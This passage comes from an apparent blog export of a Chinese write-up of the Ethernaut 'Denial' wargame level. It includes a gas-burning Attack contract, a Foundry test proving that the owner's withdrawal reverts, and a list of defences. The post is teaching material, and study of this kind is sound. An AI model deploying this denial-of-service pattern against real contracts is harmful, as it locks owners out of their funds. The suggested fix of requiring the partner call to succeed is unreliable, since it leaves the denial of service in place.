`receive()` 或 `fallback()` 函数是一个 Gas 陷阱（例如，一个无限循环），它将耗尽所有 Gas，导致整个 `withdraw()` 交易因 `out of gas` 而失败。\n\n攻击思路就是利用这一点。我们将部署一个恶意合约，并将其设置为 `partner`。当 `owner` 调用 `withdraw()` 时，对我们恶意合约的 `call` 将会执行，触发我们的恶意逻辑，从而使整个交易失败。\n\n我们的恶意合约只需要一个 `receive()` 函数，其中包含一个无限循环：\n\n```solidity\ncontract MaliciousPartner {\n    receive() external payable {\n        // Consume all gas\n        while (true) {}\n    }\n}\n```\n\n当 `withdraw()` 函数向这个合约发送以太币时，`receive()` 函数被触发，进入无限循环，耗尽所有 Gas，导致 `withdraw()` 交易 `revert`。`owner` 永远无法成功提取资金。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n攻击合约非常简单，只需要一个 `receive()` 函数。\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// 恶意合约，用于发动 DoS 攻击\ncontract Attack {\n    // 当接收到以太币时，进入无限循环以耗尽所有 Gas\n    receive() external payable {\n        while (true) {}\n    }\n}\n```\n\n### Foundry 测试代码\n\n测试代码需要验证 `withdraw()` 调用确实失败了。我们可以使用 Foundry 的 `vm.expectRevert()` 来实现这一点。\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/20_Denial.sol\";\n\ncontract DenialTest is Test {\n    Denial instance;\n    Attack attacker;\n    address owner;\n    address player; // 攻击者\n\n    function setUp() public {\n        owner = vm.addr(1);\n        player = vm.addr(2);\n\n        // 部署 Denial 合约并存入 1 ether\n        vm.startPrank(owner);\n        instance = new Denial();\n        vm.deal(address(instance), 1 ether);\n        vm.stopPrank();\n\n        // 部署攻击合约\n        attacker = new Attack();\n    }\n\n    function testDenialOfServiceAttack() public {\n        // 1. 攻击者将恶意合约设置为 partner\n        vm.prank(player);\n        instance.setWithdrawPartner(address(attacker));\n\n        // 2. owner 尝试提款\n        vm.startPrank(owner);\n        uint256 initialOwnerBalance = owner.balance;\n\n        // 3. 断言交易会失败 (revert)\n        // 因为对恶意 partner 的调用会耗尽所有 gas\n        vm.expectRevert();\n        instance.withdraw();\n\n        // 4. 验证 owner 的余额没有增加\n        assertEq(owner.balance, initialOwnerBalance);\n        vm.stopPrank();\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **部署恶意合约**: 创建一个 `Attack` 合约，其 `receive()` 函数包含一个无限循环。\n2.  **设置 `partner`**: 调用 `setWithdrawPartner()`，将 `Denial` 合约的 `partner` 设置为 `Attack` 合约的地址。\n3.  **触发漏洞**: 当 `owner` 调用 `withdraw()` 时，对 `partner` 的 `call` 会触发 `Attack` 合约的 `receive()` 函数，耗尽所有 Gas，导致整个交易失败。\n\n## 🛡️ 防御措施\n\n1.  **检查外部调用的返回值**: 永远不要假设外部调用会成功。必须检查 `call` 的返回值，并对失败情况进行处理。\n\n    ```solidity\n    // 修复建议\n    (bool sent, ) = partner.call{value: amountToSend}(\"\");\n    require(sent, \"Failed to send Ether to partner\");\n    ```\n\n2.  **遵循“检查-生效-交互”模式**: 应该在所有状态变更之后再与外部合约交互。虽然在本例中不是直接原因，但这是一个通用的安全最佳实践。\n3.  **限制 Gas**: 在进行外部调用时，明确指定转发的 Gas 数量，而不是使用默认的全额转发。这可以限制恶意合约可能造成的损害。\n\n    ```solidity\n    // 限制 Gas\n    partner.call{value: amountToSend, gas: 50000}(\"\");\n    ```\n\n4.  **引入提款模式 (Pull-over-Push)**: 不要主动“推送”资金给用户，而是让用户自己“拉取”（提款）。用户调用一个函数来提款，而不是合约自动发送资金。这可以防止因外部调用失败而导致的问题。\n\n## 🔧 相关工具和技术\n\n-   **拒绝服务 (DoS)**: 一种常见的攻击类型，旨在使系统无法为合法用户提供服务。\n-   **`call`**: Solidity 中用于与其他合约交互的底层函数。它功能强大但也很危险，需要小心使用。\n-   **`receive()` 函数**: 合约在接收到没有 `calldata` 的以太币时执行的特殊函数。\n-   **Gas**: EVM 中用于衡量计算成本的单位。对 Gas 的操纵是许多高级攻击的基础。\n\n## 🎯 总结\n\n**核心概念**:\n-   对外部合约的调用是不可信的，可能会失败或被恶意利用。\n-   必须始终检查底层 `call` 的返回值。\n-   不受限制的 Gas 转发会给恶意合约执行任意复杂（且耗 Gas）代码的机会。\n\n**攻击向量**:\n-   通过一个可被任意设置的地址，将恶意合约引入到目标合约的执行流程中。\n-   在恶意合约的 `receive()` 或 `fallback()` 函数中制造 Gas 陷阱，耗尽交易的 Gas，导致主调用失败。\n\n**防御策略**:\n-   检查 `call` 的返回值。\n-   限制外部调用的 Gas。\n-   优先使用“提款”模式而不是“推送”模式。\n\n## 📚 参考资料\n\n-   [Solidity Docs: Sending Ether](https://docs.soliditylang.org/en/latest/contracts.html#sending-ether)\n-   [Consensys: Denial of Service](https://consensys.net/diligence/blog/2018/05/known-attacks-in-smart-contracts-and-how-to-avoid-them/#denial-of-service-dos)","source":"_posts/ethernaut-level-20-denial.md","raw":"---\ntitle: 'Ethernaut Level 20: Denial - 通过外部调用实现拒绝服务'\ndate: 2025-01-25 16:45:00\nupdated: 2025-01-25 16:45:00\ncategories:\n  - Ethernaut 系列\n  - 进阶攻击篇 (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - Denial of Service\n  - DoS\n  - unchecked call\n  - 智能合约安全\nseries: Ethernaut Foundry Solutions\nexcerpt: \"学习如何利用一个不受信任的外部调用来发动拒绝服务（DoS）攻击。通过设置一个恶意的 `partner` 合约，使其在接收以太币时耗尽所有 Gas，从而阻止 `owner` 提取资金，掌握 Denial 关卡的破解技巧。\"\n---\n\n# 🎯 Ethernaut Level 20: Denial - 通过外部调用实现拒绝服务\n\n> **关卡链接**: [Ethernaut Level 20 - Denial](https://ethernaut.openzeppelin.com/level/20)  \n> **攻击类型**: 拒绝服务 (Denial of Service - DoS)  \n> **难度**: ⭐⭐☆☆☆\n\n## 📋 挑战目标\n\n本关的目标是阻止 `owner` 从合约中提取资金。你需要让 `withdraw()` 函数无法成功执行，从而实现拒绝服务攻击。\n\n![Denial Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel20.svg)\n\n## 🔍 漏洞分析\n\n让我们仔细看看 `withdraw()` 函数的实现：\n\n```solidity\ncontract Denial {\n    // ...\n    address public partner; // The partner can be set by anyone.\n\n    function setWithdrawPartner(address _partner) public {\n        partner = _partner;\n    }\n\n    function withdraw() public {\n        uint amountToSend = address(this).balance / 100;\n        \n        // Perform the call. We don't check the return value.\n        partner.call{value: amountToSend}(\"\");\n        \n        payable(owner).transfer(amountToSend);\n    }\n}\n```\n\n漏洞点非常明确：\n\n1.  **任意设置 `partner`**: 任何人都可以调用 `setWithdrawPartner()` 来设置 `partner` 地址。这意味着我们可以将 `partner` 设置为我们自己控制的恶意合约。\n2.  **未检查的外部调用**: `partner.call{value: amountToSend}(\"\")` 是一个对外部合约的调用。关键在于，代码**没有检查 `call` 的返回值**。如果这个 `call` 失败，函数会继续执行。\n3.  **Gas 转发**: `call` 默认会转发所有剩余的 Gas。如果 `partner` 合约的 `receive()` 或 `fallback()` 函数是一个 Gas 陷阱（例如，一个无限循环），它将耗尽所有 Gas，导致整个 `withdraw()` 交易因 `out of gas` 而失败。\n\n攻击思路就是利用这一点。我们将部署一个恶意合约，并将其设置为 `partner`。当 `owner` 调用 `withdraw()` 时，对我们恶意合约的 `call` 将会执行，触发我们的恶意逻辑，从而使整个交易失败。\n\n我们的恶意合约只需要一个 `receive()` 函数，其中包含一个无限循环：\n\n```solidity\ncontract MaliciousPartner {\n    receive() external payable {\n        // Consume all gas\n        while (true) {}\n    }\n}\n```\n\n当 `withdraw()` 函数向这个合约发送以太币时，`receive()` 函数被触发，进入无限循环，耗尽所有 Gas，导致 `withdraw()` 交易 `revert`。`owner` 永远无法成功提取资金。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n攻击合约非常简单，只需要一个 `receive()` 函数。\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// 恶意合约，用于发动 DoS 攻击\ncontract Attack {\n    // 当接收到以太币时，进入无限循环以耗尽所有 Gas\n    receive() external payable {\n        while (true) {}\n    }\n}\n```\n\n### Foundry 测试代码\n\n测试代码需要验证 `withdraw()` 调用确实失败了。我们可以使用 Foundry 的 `vm.expectRevert()` 来实现这一点。\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/20_Denial.sol\";\n\ncontract DenialTest is Test {\n    Denial instance;\n    Attack attacker;\n    address owner;\n    address player; // 攻击者\n\n    function setUp() public {\n        owner = vm.addr(1);\n        player = vm.addr(2);\n\n        // 部署 Denial 合约并存入 1 ether\n        vm.startPrank(owner);\n        instance = new Denial();\n        vm.deal(address(instance), 1 ether);\n        vm.stopPrank();\n\n        // 部署攻击合约\n        attacker = new Attack();\n    }\n\n    function testDenialOfServiceAttack() public {\n        // 1. 攻击者将恶意合约设置为 partner\n        vm.prank(player);\n        instance.setWithdrawPartner(address(attacker));\n\n        // 2. owner 尝试提款\n        vm.startPrank(owner);\n        uint256 initialOwnerBalance = owner.balance;\n\n        // 3. 断言交易会失败 (revert)\n        // 因为对恶意 partner 的调用会耗尽所有 gas\n        vm.expectRevert();\n        instance.withdraw();\n\n        // 4. 验证 owner 的余额没有增加\n        assertEq(owner.balance, initialOwnerBalance);\n        vm.stopPrank();\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **部署恶意合约**: 创建一个 `Attack` 合约，其 `receive()` 函数包含一个无限循环。\n2.  **设置 `partner`**: 调用 `setWithdrawPartner()`，将 `Denial` 合约的 `partner` 设置为 `Attack` 合约的地址。\n3.  **触发漏洞**: 当 `owner` 调用 `withdraw()` 时，对 `partner` 的 `call` 会触发 `Attack` 合约的 `receive()` 函数，耗尽所有 Gas，导致整个交易失败。\n\n## 🛡️ 防御措施\n\n1.  **检查外部调用的返回值**: 永远不要假设外部调用会成功。必须检查 `call` 的返回值，并对失败情况进行处理。\n\n    ```solidity\n    // 修复建议\n    (bool sent, ) = partner.call{value: amountToSend}(\"\");\n    require(sent, \"Failed to send Ether to partner\");\n    ```\n\n2.  **遵循“检查-生效-交互”模式**: 应该在所有状态变更之后再与外部合约交互。虽然在本例中不是直接原因，但这是一个通用的安全最佳实践。\n3.  **限制 Gas**: 在进行外部调用时，明确指定转发的 Gas 数量，而不是使用默认的全额转发。这可以限制恶意合约可能造成的损害。\n\n    ```solidity\n    // 限制 Gas\n    partner.call{value: amountToSend, gas: 50000}(\"\");\n    ```\n\n4.  **引入提款模式 (Pull-over-Push)**: 不要主动“推送”资金给用户，而是让用户自己“拉取”（提款）。用户调用一个函数来提款，而不是合约自动发送资金。这可以防止因外部调用失败而导致的问题。\n\n## 🔧 相关工具和技术\n\n-   **拒绝服务 (DoS)**: 一种常见的攻击类型，旨在使系统无法为合法用户提供服务。\n-   **`call`**: Solidity 中用于与其他合约交互的底层函数。它功能强大但也很危险，需要小心使用。\n-   **`receive()` 函数**: 合约在接收到没有 `calldata` 的以太币时执行的特殊函数。\n-   **Gas**: EVM 中用于衡量计算成本的单位。对 Gas 的操纵是许多高级攻击的基础。\n\n## 🎯 总结\n\n**核心概念**:\n-   对外部合约的调用是不可信的，可能会失败或被恶意利用。\n-   必须始终检查底层 `call` 的返回值。\n-   不受限制的 Gas 转发会给恶意合约执行任意复杂（且耗 Gas）代码的机会。\n\n**攻击向量**:\n-   通过一个可被任意设置的地址，将恶意合约引入到目标合约的执行流程中。\n-   在恶意合约的 `receive()` 或 `fallback()` 函数中制造 Gas 陷阱，耗尽交易的 Gas，导致主调用失败。\n\n**防御策略**:\n-   检查 `call` 的返回值。\n-   限制外部调用的 Gas。\n-   优先使用“提款”模式而不是“推送”模式。\n\n## 📚 参考资料\n\n-   [Solidity Docs: Sending Ether](https://docs.soliditylang.org/en/latest/contracts.html#sending-ether)\n-   [Consensys: Denial of Service](https://consensys.net/diligence/blog/2018/05/known-attacks-in-smart-contracts-and-how-to-avoid-them/#denial-of-service-dos)","slug":"ethernaut-level-20-denial","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbph001gbf5qdvjialg1","content":"<h1 id=\"🎯-Ethernaut-Level-20-Denial-通过外部调用实现拒绝服务\"><a href=\"#🎯-Ethernaut-Level-20-Denial-通过外部调用实现拒绝服务\" class=\"headerlink\" title=\"🎯 Ethernaut Level 20: Denial - 通过外部调用实现拒绝服务\"></a>🎯 Ethernaut Level 20: Denial - 通过外部调用实现拒绝服务</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/20\">Ethernaut Level 20 - Denial</a><br><strong>攻击类型</strong>: 拒绝服务 (Denial of Service - DoS)<br><strong>难度</strong>: ⭐⭐☆☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>本关的目标是阻止 <code>owner</code> 从合约中提取资金。你需要让 <code>withdraw()</code> 函数无法成功执行，从而实现拒绝服务攻击。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel20.svg\" alt=\"Denial Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>让我们仔细看看 <code>withdraw()</code> 函数的实现：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Denial &#123;</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">    address public partner; // The partner can be set by anyone.</span><br><span class=\"line\"></span><br><span class=\"line\">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class=\"line\">        partner = _partner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function withdraw() public &#123;</span><br><span class=\"line\">        uint amountToSend = address(this).balance / 100;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // Perform the call. We don&#x27;t check the return value.</span><br><span class=\"line\">        partner.call&#123;value: amountToSend&#125;(&quot;&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        payable(owner).transfer(amountToSend);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>漏洞点非常明确：</p>\n<ol>\n<li><strong>任意设置 <code>partner</code></strong>: 任何人都可以调用 <code>setWithdrawPartner()</code> 来设置 <code>partner</code> 地址。这意味着我们可以将 <code>partner</code> 设置为我们自己控制的恶意合约。</li>\n<li><strong>未检查的外部调用</strong>: <code>partner.call&#123;value: amountToSend&#125;(&quot;&quot;)</code> 是一个对外部合约的调用。关键在于，代码<strong>没有检查 <code>call</code> 的返回值</strong>。如果这个 <code>call</code> 失败，函数会继续执行。</li>\n<li><strong>Gas 转发</strong>: <code>call</code> 默认会转发所有剩余的 Gas。如果 <code>partner</code> 合约的 <code>receive()</code> 或 <code>fallback()</code> 函数是一个 Gas 陷阱（例如，一个无限循环），它将耗尽所有 Gas，导致整个 <code>withdraw()</code> 交易因 <code>out of gas</code> 而失败。</li>\n</ol>\n<p>攻击思路就是利用这一点。我们将部署一个恶意合约，并将其设置为 <code>partner</code>。当 <code>owner</code> 调用 <code>withdraw()</code> 时，对我们恶意合约的 <code>call</code> 将会执行，触发我们的恶意逻辑，从而使整个交易失败。</p>\n<p>我们的恶意合约只需要一个 <code>receive()</code> 函数，其中包含一个无限循环：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract MaliciousPartner &#123;</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        // Consume all gas</span><br><span class=\"line\">        while (true) &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>当 <code>withdraw()</code> 函数向这个合约发送以太币时，<code>receive()</code> 函数被触发，进入无限循环，耗尽所有 Gas，导致 <code>withdraw()</code> 交易 <code>revert</code>。<code>owner</code> 永远无法成功提取资金。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><p>攻击合约非常简单，只需要一个 <code>receive()</code> 函数。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">// 恶意合约，用于发动 DoS 攻击</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    // 当接收到以太币时，进入无限循环以耗尽所有 Gas</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        while (true) &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Foundry-测试代码\"><a href=\"#Foundry-测试代码\" class=\"headerlink\" title=\"Foundry 测试代码\"></a>Foundry 测试代码</h3><p>测试代码需要验证 <code>withdraw()</code> 调用确实失败了。我们可以使用 Foundry 的 <code>vm.expectRevert()</code> 来实现这一点。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/20_Denial.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract DenialTest is Test &#123;</span><br><span class=\"line\">    Denial instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address owner;</span><br><span class=\"line\">    address player; // 攻击者</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        owner = vm.addr(1);</span><br><span class=\"line\">        player = vm.addr(2);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 部署 Denial 合约并存入 1 ether</span><br><span class=\"line\">        vm.startPrank(owner);</span><br><span class=\"line\">        instance = new Denial();</span><br><span class=\"line\">        vm.deal(address(instance), 1 ether);</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 部署攻击合约</span><br><span class=\"line\">        attacker = new Attack();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testDenialOfServiceAttack() public &#123;</span><br><span class=\"line\">        // 1. 攻击者将恶意合约设置为 partner</span><br><span class=\"line\">        vm.prank(player);</span><br><span class=\"line\">        instance.setWithdrawPartner(address(attacker));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. owner 尝试提款</span><br><span class=\"line\">        vm.startPrank(owner);</span><br><span class=\"line\">        uint256 initialOwnerBalance = owner.balance;</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. 断言交易会失败 (revert)</span><br><span class=\"line\">        // 因为对恶意 partner 的调用会耗尽所有 gas</span><br><span class=\"line\">        vm.expectRevert();</span><br><span class=\"line\">        instance.withdraw();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. 验证 owner 的余额没有增加</span><br><span class=\"line\">        assertEq(owner.balance, initialOwnerBalance);</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>部署恶意合约</strong>: 创建一个 <code>Attack</code> 合约，其 <code>receive()</code> 函数包含一个无限循环。</li>\n<li><strong>设置 <code>partner</code></strong>: 调用 <code>setWithdrawPartner()</code>，将 <code>Denial</code> 合约的 <code>partner</code> 设置为 <code>Attack</code> 合约的地址。</li>\n<li><strong>触发漏洞</strong>: 当 <code>owner</code> 调用 <code>withdraw()</code> 时，对 <code>partner</code> 的 <code>call</code> 会触发 <code>Attack</code> 合约的 <code>receive()</code> 函数，耗尽所有 Gas，导致整个交易失败。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><p><strong>检查外部调用的返回值</strong>: 永远不要假设外部调用会成功。必须检查 <code>call</code> 的返回值，并对失败情况进行处理。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 修复建议</span><br><span class=\"line\">(bool sent, ) = partner.call&#123;value: amountToSend&#125;(&quot;&quot;);</span><br><span class=\"line\">require(sent, &quot;Failed to send Ether to partner&quot;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>遵循“检查-生效-交互”模式</strong>: 应该在所有状态变更之后再与外部合约交互。虽然在本例中不是直接原因，但这是一个通用的安全最佳实践。</p>\n</li>\n<li><p><strong>限制 Gas</strong>: 在进行外部调用时，明确指定转发的 Gas 数量，而不是使用默认的全额转发。这可以限制恶意合约可能造成的损害。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 限制 Gas</span><br><span class=\"line\">partner.call&#123;value: amountToSend, gas: 50000&#125;(&quot;&quot;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>引入提款模式 (Pull-over-Push)</strong>: 不要主动“推送”资金给用户，而是让用户自己“拉取”（提款）。用户调用一个函数来提款，而不是合约自动发送资金。这可以防止因外部调用失败而导致的问题。</p>\n</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>拒绝服务 (DoS)</strong>: 一种常见的攻击类型，旨在使系统无法为合法用户提供服务。</li>\n<li><strong><code>call</code></strong>: Solidity 中用于与其他合约交互的底层函数。它功能强大但也很危险，需要小心使用。</li>\n<li><strong><code>receive()</code> 函数</strong>: 合约在接收到没有 <code>calldata</code> 的以太币时执行的特殊函数。</li>\n<li><strong>Gas</strong>: EVM 中用于衡量计算成本的单位。对 Gas 的操纵是许多高级攻击的基础。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>对外部合约的调用是不可信的，可能会失败或被恶意利用。</li>\n<li>必须始终检查底层 <code>call</code> 的返回值。</li>\n<li>不受限制的 Gas 转发会给恶意合约执行任意复杂（且耗 Gas）代码的机会。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>通过一个可被任意设置的地址，将恶意合约引入到目标合约的执行流程中。</li>\n<li>在恶意合约的 <code>receive()</code> 或 <code>fallback()</code> 函数中制造 Gas 陷阱，耗尽交易的 Gas，导致主调用失败。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>检查 <code>call</code> 的返回值。</li>\n<li>限制外部调用的 Gas。</li>\n<li>优先使用“提款”模式而不是“推送”模式。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#sending-ether\">Solidity Docs: Sending Ether</a></li>\n<li><a href=\"https://consensys.net/diligence/blog/2018/05/known-attacks-in-smart-contracts-and-how-to-avoid-them/#denial-of-service-dos\">Consensys: Denial of Service</a></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-20-Denial-通过外部调用实现拒绝服务\"><a href=\"#🎯-Ethernaut-Level-20-Denial-通过外部调用实现拒绝服务\" class=\"headerlink\" title=\"🎯 Ethernaut Level 20: Denial - 通过外部调用实现拒绝服务\"></a>🎯 Ethernaut Level 20: Denial - 通过外部调用实现拒绝服务</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/20\">Ethernaut Level 20 - Denial</a><br><strong>攻击类型</strong>: 拒绝服务 (Denial of Service - DoS)<br><strong>难度</strong>: ⭐⭐☆☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>本关的目标是阻止 <code>owner</code> 从合约中提取资金。你需要让 <code>withdraw()</code> 函数无法成功执行，从而实现拒绝服务攻击。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel20.svg\" alt=\"Denial Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>让我们仔细看看 <code>withdraw()</code> 函数的实现：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Denial &#123;</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">    address public partner; // The partner can be set by anyone.</span><br><span class=\"line\"></span><br><span class=\"line\">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class=\"line\">        partner = _partner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function withdraw() public &#123;</span><br><span class=\"line\">        uint amountToSend = address(this).balance / 100;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // Perform the call. We don&#x27;t check the return value.</span><br><span class=\"line\">        partner.call&#123;value: amountToSend&#125;(&quot;&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        payable(owner).transfer(amountToSend);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>漏洞点非常明确：</p>\n<ol>\n<li><strong>任意设置 <code>partner</code></strong>: 任何人都可以调用 <code>setWithdrawPartner()</code> 来设置 <code>partner</code> 地址。这意味着我们可以将 <code>partner</code> 设置为我们自己控制的恶意合约。</li>\n<li><strong>未检查的外部调用</strong>: <code>partner.call&#123;value: amountToSend&#125;(&quot;&quot;)</code> 是一个对外部合约的调用。关键在于，代码<strong>没有检查 <code>call</code> 的返回值</strong>。如果这个 <code>call</code> 失败，函数会继续执行。</li>\n<li><strong>Gas 转发</strong>: <code>call</code> 